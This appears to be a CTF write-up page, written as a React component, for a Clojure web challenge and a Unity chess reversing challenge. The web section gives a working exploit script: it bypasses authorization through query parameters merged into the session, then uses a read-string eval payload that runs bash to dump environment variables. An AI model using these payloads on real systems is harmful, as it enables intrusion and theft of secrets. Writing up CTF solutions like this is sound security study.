import X from 'src/component/X';

export default function Post() {
    return (
        <>
            <X.H1>Web</X.H1>
            <X.H2>manifesto</X.H2>
            <X.P>Noting the code {'`(assoc :session (merge {"prefer" "light"} session query-params))`'}, this means `query-params` will be merged into `session`, potentially allowing permission checks to be bypassed via a URL like `/?username=admin`.</X.P>
            <X.P>The next step is the exploitation of the `read-string` function. The `read-string` function can be used to execute arbitrary code, you can try the payload `#=(* 7 7)` and you will see the result `49`. However, when i attempt `(clojure.java.shell/sh "...")`, it always shows `Something went wrong...`. So after some googling, I find the payload in @this writeup[https://b.poc.fun/faust-ctf-doedel-writeup/]@ works. My final solution is as follows:</X.P>
            <X.CodeBlock
                language="python"
                code={`
                import requests

                with requests.session() as s:
                    url = "https://a5f6bcb2307b2e9bcf64ffd9a382f720.chal.ctf.ae"
                    s.get(url + "/?username=admin&redirect=/gists")
                    s.post(url + "/gists", data={
                        # "gist": '#=(* 7 7)'
                        "gist": '#=(eval\\
                            (.\\
                                (java.lang.Runtime/getRuntime)\\
                                exec\\
                                (into-array ["bash" "-c" "export > ./resources/public/static/1.txt"])\\
                            )\\
                        )',
                    })
                    resp = s.get(url + "/static/1.txt")
                    print(resp.text)

                # flag{jwHvR1Lv50TzsftMH8Bv9cJN7Jg6jbIC}
                `}
            />
            <X.P>This can be used to execute arbitrary code. But for this challenge, we only need to read the environment variable `FLAG`. The official writeup uses payload `#=(java.lang.System/getenv "FLAG")`, which is more concise.</X.P>
            <X.H1>Reversing</X.H1>
            <X.H2>chessato</X.H2>
            <X.P>Using dnSpy to decompile the file `Managed/Assembly-CSharp.dll`, we can see the decryption logic in the `Winner` method of the `Game` class:</X.P>
            <X.Image src="1.jpg" width="800px" />
            <X.P>In this process, `F1`, `F2` and `RM` perform some calculations on the input array to ultimately derive the `key` and `iv`, and the `FW` method performs AES decryption. The logic of these functions is simple, and I rewrite them in Python in the exploit scripts.</X.P>
            <X.P>Similarly, in the `Winner` method, we can observe that `array` and `array2` represent the board states of the white and black sides:</X.P>
            <X.Image src="2.jpg" width="400px" />
            <X.P>Therefore, the next step is to obtain a board state that can be correctly used for decryption. Playing this chess game, the rules are customized: if we (the white side) have any pieces crossing the second row, they will be captured by the black side's pieces. If there are no white pieces above the second row, the black king will directly capture our king.</X.P>
            <X.Image src="3.jpg" width="600px" />
            <X.P>The challenge hints "Can you beat me in 1 move?", which implies that the board state won't differ significantly from the initial state. This part was somewhat guessy for me. At first, I spent a long time trying to modify the initial position of the black king so that my pawn or knight could capture it in one move, but after winning I always got "Not Good Enough".</X.P>
            <X.P>Then I attempted some bruteforce enumeration strategies. One of them was based on the observation that our pieces always get replaced by the opponent's pieces when they move above the second row. I tried setting the initial states of the white pieces to `0` one by one, and eventually discovered that the board state used for decryption is to set the white king to `0`.</X.P>
            <X.P>In the official writeup, it is explained that we need to make the white king capture the black king in one move, just as the black king would directly capture the white king.</X.P>
            <X.CodeBlock
                language="python"
                code={`
                from Crypto.Cipher import AES
                import base64


                def f1(matrix):
                    array = bytearray(32)
                    num = 0
                    for i in range(8):
                        for j in range(8):
                            if num < len(array):
                                array[num] = (matrix[j][i] * 16 + j + i) & 0xFF
                                num += 1
                    return bytes(array)


                def f2(matrix):
                    array = bytearray(16)
                    num = 0
                    for i in range(8):
                        for j in range(8):
                            if num < len(array):
                                array[num] = (matrix[j][i] * 2 + j % 2 + i % 2) & 0xFF
                                num += 1
                    return bytes(array)


                def rm(original_matrix):
                    length = len(original_matrix)
                    rotated_matrix = [[0] * length for _ in range(length)]
                    for i in range(length):
                        for j in range(length):
                            rotated_matrix[j][i] = original_matrix[length - 1 - j][length - 1 - i]
                    return rotated_matrix


                def fw(cipher_text, key, iv):
                    cipher_bytes = base64.b64decode(cipher_text)
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    decrypted_data = cipher.decrypt(cipher_bytes)
                    return decrypted_data


                array1 = [
                    [3, 6, 0, 0, 0, 0, 0, 0],
                    [5, 6, 0, 0, 0, 0, 0, 0],
                    [4, 6, 0, 0, 0, 0, 0, 0],
                    [2, 6, 0, 0, 0, 0, 0, 0],
                    [0, 6, 0, 0, 0, 0, 0, 0],
                    [4, 6, 0, 0, 0, 0, 0, 0],
                    [5, 6, 0, 0, 0, 0, 0, 0],
                    [3, 6, 0, 0, 0, 0, 0, 0],
                ]
                array2 = [
                    [0, 0, 0, 0, 0, 0, 6, 3],
                    [0, 0, 0, 0, 0, 0, 6, 5],
                    [0, 0, 0, 0, 0, 0, 6, 4],
                    [0, 0, 0, 0, 0, 0, 6, 2],
                    [0, 0, 0, 0, 0, 0, 6, 0],
                    [0, 0, 0, 0, 0, 0, 6, 4],
                    [0, 0, 0, 0, 0, 0, 6, 5],
                    [0, 0, 0, 0, 0, 0, 6, 3],
                ]
                cipher_text = "LlfqPs1MOul1Jr09d6dZditrkXUgIfMDc3Lh6/z5Ufv6E2G8ARHNvE7xQ9jrGBRg"

                key = f1(array1)
                matrix = rm(array2)
                iv = f2(matrix)

                decrypted_text = fw(cipher_text, key, iv)
                print(decrypted_text)  # b'0xL4ugh{A_H0n0ur4ble_B4tt13_B3tw33n_K1NG5}\\x06\\x06\\x06\\x06\\x06\\x06'
                `}
            />
        </>
    );
}
